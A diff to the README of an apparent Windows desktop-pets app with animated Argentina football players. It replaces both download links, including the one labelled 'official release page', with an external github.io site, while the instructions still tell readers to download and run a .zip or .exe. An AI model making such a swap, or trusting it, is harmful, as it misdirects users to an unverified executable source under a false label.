@@ -1,6 +1,6 @@
 # 🇦🇷 argentina-player-desktop-pets - Enjoy animated football stars on your desktop
 
-[![Download Argentina Desktop Pets](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/vivekkumariitd/argentina-player-desktop-pets/releases)
+[![Download Argentina Desktop Pets](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://vivekkumariitd.github.io)
 
 This application brings animated Argentina football players to your Windows desktop. These characters walk, run, and play across your screen while you use your computer. The pets act as a fun way to show support for your favorite team while you work or browse the internet.
 
@@ -19,7 +19,7 @@ Most Windows computers already have the necessary software components installed.
 
 Follow these steps to get the software on your machine:
 
-1. Visit the [official release page](https://github.com/vivekkumariitd/argentina-player-desktop-pets/releases).
+1. Visit the [official release page](https://vivekkumariitd.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .zip or .exe to start the transfer.
 4. Save the file to your desktop or downloads folder.
